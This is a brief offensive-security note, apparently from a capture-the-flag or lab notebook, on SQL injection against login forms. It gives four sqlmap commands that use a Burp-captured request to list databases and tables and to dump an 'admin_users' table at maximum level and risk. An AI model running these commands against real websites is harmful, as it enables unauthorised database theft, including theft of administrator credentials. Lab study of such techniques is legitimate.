Related Articles: 
Tags: #Maneuvers 

---

Whenever we find some login forms on a website we can try to SQLi it. 


SQL injections via SQL MAP;

In order to be able to successfully attempt to SQLi via SQLMAP you have to intercept the request form via Burp Suite and then save it to a file, once saved use the -r switch in sqlmap and point it to the saved file:
```
sqlmap -r request.txt -p email --level 5 --risk 3 --batch --threads 10 --dbs
```
```
sqlmap -r request.txt -p email --batch --level 5 --risk 3 --dbms=mysql --dbs
```
```
sqlmap -r request.txt -p email --level 5 --risk 3 --batch --dbms=mysql -D usage_blog -T admin_users --dump --threads 10
```
```
sqlmap -r request.txt -p email --batch --level 5 --risk 3 --dbms=mysql -D usage_blog --tables --threads 10
```

